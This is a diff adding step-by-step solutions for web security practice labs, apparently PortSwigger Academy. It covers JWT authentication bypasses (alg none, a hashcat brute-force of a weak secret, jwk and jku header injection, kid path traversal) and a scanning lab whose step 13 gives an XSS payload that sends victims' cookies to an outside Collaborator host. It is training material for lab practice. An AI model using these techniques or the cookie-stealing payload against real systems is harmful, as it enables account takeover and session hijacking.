@@ -2564,6 +2564,177 @@ Solving this lab requires multiple steps. First, you need to identify where the 
 6.  Submit the secret to solve the lab.
 ---
 
+# JWT
+
+### Lab: JWT authentication bypass via unverified signature
+
+1. In the lab, log in to your own account.
+2. In Burp, go to the Proxy > HTTP history tab and look at the post-login `GET /my-account` request. Observe that your session cookie is a JWT.
+3. Double-click the payload part of the token to view its decoded JSON form in the Inspector panel. Notice that the sub claim contains your username. Send this request to Burp Repeater.
+4. In Burp Repeater, change the path to `/admin` and send the request. Observe that the admin panel is only accessible when logged in as the administrator user.
+5. Select the payload of the JWT again. In the Inspector panel, change the value of the sub claim from wiener to administrator, then click Apply changes.
+6. Send the request again. Observe that you have successfully accessed the admin panel.
+7. In the response, find the URL for deleting carlos (/admin/delete?username=carlos). Send the request to this endpoint to solve the lab.
+
+### Lab: JWT authentication bypass via flawed signature verification
+
+1. In the lab, log in to your own account.
+2. In Burp, go to the Proxy > HTTP history tab and look at the post-login `GET /my-account` request. Observe that your session cookie is a JWT.
+3. Double-click the payload part of the token to view its decoded JSON form in the Inspector panel. Notice that the sub claim contains your username. Send this request to Burp Repeater.
+4. In Burp Repeater, change the path to `/admin` and send the request. Observe that the admin panel is only accessible when logged in as the administrator user.
+5. Select the payload of the JWT again. In the Inspector panel, change the value of the sub claim to administrator, then click Apply changes.
+6. Select the header of the JWT, then use the Inspector to change the value of the alg parameter to none. Click Apply changes.
+7. In the message editor, remove the signature from the JWT, but remember to leave the trailing dot after the payload.
+8. Send the request and observe that you have successfully accessed the admin panel.
+9. In the response, find the URL for deleting carlos (/admin/delete?username=carlos). Send the request to this endpoint to solve the lab.
+
+### 
+
+Lab: JWT authentication bypass via weak signing key
+
+1. In Burp, load the JWT Editor extension from the BApp store.
+2. In the lab, log in to your own account and send the post-login GET /my-account request to Burp Repeater.
+3. In Burp Repeater, change the path to /admin and send the request. Observe that the admin panel is only accessible when logged in as the administrator user.
+4. Copy the JWT and brute-force the secret. You can do this using hashcat as follows: `hashcat -a 0 -m 16500 <YOUR-JWT> /path/to/jwt.secrets.list`
+5. If you're using hashcat, this outputs the JWT, followed by the secret. If everything worked correctly, this should reveal that the weak secret is secret1.
+
+Note
+Note that if you run the command more than once, you need to include the --show flag to output the results to the console again.
+
+6. Using Burp Decoder, Base64 encode the secret that you brute-forced in the previous section.
+7. In Burp, go to the JWT Editor Keys tab and click New Symmetric Key. In the dialog, click Generate to generate a new key in JWK format. Note that you don't need to select a key size as this will automatically be updated later.
+8. Replace the generated value for the k property with the Base64-encoded secret.
+9. Click OK to save the key.
+10. Go back to the GET /admin request in Burp Repeater and switch to the extension-generated JSON Web Token message editor tab.
+11. In the payload, change the value of the sub claim to administrator
+12. At the bottom of the tab, click Sign, then select the key that you generated in the previous section.
+13. Make sure that the Don't modify header option is selected, then click OK. The modified token is now signed with the correct signature.
+14. Send the request and observe that you have successfully accessed the admin panel.
+15. In the response, find the URL for deleting carlos (/admin/delete?username=carlos). Send the request to this endpoint to solve the lab.
+
+### Lab: JWT authentication bypass via jwk header injection
+
+1. In Burp, load the JWT Editor extension from the BApp store.
+2. In the lab, log in to your own account and send the post-login GET /my-account request to Burp Repeater.
+3. In Burp Repeater, change the path to /admin and send the request. Observe that the admin panel is only accessible when logged in as the administrator user.
+4. Go to the JWT Editor Keys tab in Burp's main tab bar.
+5. Click New RSA Key.
+6. In the dialog, click Generate to automatically generate a new key pair, then click OK to save the key. Note that you don't need to select a key size as this will automatically be updated later.
+7. Go back to the GET /admin request in Burp Repeater and switch to the extension-generated JSON Web Token tab.
+8. In the payload, change the value of the sub claim to administrator.
+9. At the bottom of the JSON Web Token tab, click Attack, then select Embedded JWK. When prompted, select your newly generated RSA key and click OK.
+10. In the header of the JWT, observe that a jwk parameter has been added containing your public key.
+11. Send the request. Observe that you have successfully accessed the admin panel.
+12. In the response, find the URL for deleting carlos (/admin/delete?username=carlos). Send the request to this endpoint to solve the lab.
+
+Note
+
+Instead of using the built-in attack in the JWT Editor extension, you can embed a JWK by adding a jwk parameter to the header of the JWT manually. In this case, you need to also update the kid header of the token to match the kid of the embedded key.
+
+### Lab: JWT authentication bypass via jku header injection
+
+1. In Burp, load the JWT Editor extension from the BApp store.
+2. In the lab, log in to your own account and send the post-login GET /my-account request to Burp Repeater.
+3. In Burp Repeater, change the path to /admin and send the request. Observe that the admin panel is only accessible when logged in as the administrator user.
+4. Go to the JWT Editor Keys tab in Burp's main tab bar.
+5. Click New RSA Key.
+6. In the dialog, click Generate to automatically generate a new key pair, then click OK to save the key. Note that you don't need to select a key size as this will automatically be updated later.
+7. In the browser, go to the exploit server.
+8. Replace the contents of the Body section with an empty JWK Set as follows:
+
+    {
+        "keys": [
+
+        ]
+    }
+
+9. Back on the JWT Editor Keys tab, right-click on the entry for the key that you just generated, then select Copy Public Key as JWK.
+10. Paste the JWK into the keys array on the exploit server, then store the exploit. The result should look something like this:
+
+    {
+        "keys": [
+            {
+                "kty": "RSA",
+                "e": "AQAB",
+                "kid": "893d8f0b-061f-42c2-a4aa-5056e12b8ae7",
+                "n": "yy1wpYmffgXBxhAUJzHHocCuJolwDqql75ZWuCQ_cb33K2vh9mk6GPM9gNN4Y_qTVX67WhsN3JvaFYw"
+            }
+        ]
+    }
+
+11. Go back to the GET /admin request in Burp Repeater and switch to the extension-generated JSON Web Token message editor tab.
+12. In the header of the JWT, replace the current value of the kid parameter with the kid of the JWK that you uploaded to the exploit server.
+13. Add a new jku parameter to the header of the JWT. Set its value to the URL of your JWK Set on the exploit server.
+14. In the payload, change the value of the sub claim to administrator.
+15. At the bottom of the tab, click Sign, then select the RSA key that you generated in the previous section.
+16. Make sure that the Don't modify header option is selected, then click OK. The modified token is now signed with the correct signature.
+17. Send the request. Observe that you have successfully accessed the admin panel.
+18. In the response, find the URL for deleting carlos (/admin/delete?username=carlos). Send the request to this endpoint to solve the lab.
+
+### Lab: JWT authentication bypass via kid header path traversal
 
 
+Note
+
+In this solution, we'll point the kid parameter to the standard file /dev/null. In practice, you can point the kid parameter to any file with predictable contents.
+
+1. In Burp, load the JWT Editor extension from the BApp store.
+2. In the lab, log in to your own account and send the post-login GET /my-account request to Burp Repeater.
+3. In Burp Repeater, change the path to /admin and send the request. Observe that the admin panel is only accessible when logged in as the administrator user.
+4. Go to the JWT Editor Keys tab in Burp's main tab bar.
+5. Click New Symmetric Key.
+6. In the dialog, click Generate to generate a new key in JWK format. Note that you don't need to select a key size as this will automatically be updated later.
+7. Replace the generated value for the k property with a Base64-encoded null byte (AA==). Note that this is just a workaround because the JWT Editor extension won't allow you to sign tokens using an empty string.
+8. Click OK to save the key.
+9. Go back to the GET /admin request in Burp Repeater and switch to the extension-generated JSON Web Token message editor tab.
+10. In the header of the JWT, change the value of the kid parameter to a path traversal sequence pointing to the /dev/null file: `../../../../../../../dev/null`
+11. In the JWT payload, change the value of the sub claim to administrator.
+12. At the bottom of the tab, click Sign, then select the symmetric key that you generated in the previous section.
+13. Make sure that the Don't modify header option is selected, then click OK. The modified token is now signed using a null byte as the secret key.
+14. Send the request and observe that you have successfully accessed the admin panel.
+15. In the response, find the URL for deleting carlos (/admin/delete?username=carlos). Send the request to this endpoint to solve the lab.
+
+---
+
+# Essential Skills
+
+### Lab: Discovering vulnerabilities quickly with targeted scanning
+
+### Lab: Scanning non-standard data structures
+
+1. Log in to your account with the provided credentials.
+2. In Burp, go to the Proxy > HTTP history tab.
+3. Find the GET /my-account?id=wiener request, which contains your new authenticated session cookie.
+4. Study the session cookie and notice that it contains your username in cleartext, followed by a token of some kind. These are separated by a colon, which suggests that the application may treat the cookie value as two distinct inputs.
+5. Select the first part of the session cookie, the cleartext wiener.
+6. Right-click and select Scan selected insertion point, then click OK.
+7. Go to the Dashboard and wait for the scan to complete.
+
+Approximately one minute after the scan starts, notice that Burp Scanner reports a Cross-site scripting (stored) issue. It has detected this by triggering an interaction with the Burp Collaborator server.
+Note
+
+Note
+
+The delay in reporting the issue is due to the polling interval. By default, Burp polls the Burp Collaborator server for new interactions every minute.
+
+8. In the Dashboard, select the identified issue.
+9. In the lower panel, open the Request tab. This contains the request that Burp Scanner used to identify the issue.
+10. Send the request to Burp Repeater.
+11. Go to the Collaborator tab and click Copy to clipboard. A new Burp Collaborator payload is saved to your clipboard.
+12. Go to the Repeater tab and use the Inspector to view the cookie in its decoded form.
+13. Using the Collaborator payload you just copied, replace the proof-of-concept that Burp Scanner used with an exploit that exfiltrates the victim's cookies. For example: `'"><svg/onload=fetch(``//YOUR-COLLABORATOR-PAYLOAD/${encodeURIComponent(document.cookie)}``)>:YOUR-SESSION-ID`
+
+Note that you need to preserve the second part of the cookie containing your session ID.
+    
+14. Click Apply changes, and then click Send.
+15. Go back to the Collaborator tab. After approximately one minute, click Poll now. Notice that the Collaborator server has received new DNS and HTTP interactions.
+16. Select one of the HTTP interactions.
+17. On the Request to Collaborator tab, notice that the path of the request contains the admin user's cookies.
+18. Copy the admin user's session cookie.
+19. Go to Burp's browser and open the DevTools menu.
+20. Go to the Application tab and select Cookies.
+21. Replace your session cookie with the admin user's session cookie, and refresh the page.
+22. Access the admin panel and delete carlos to solve the lab.
+
+---
 
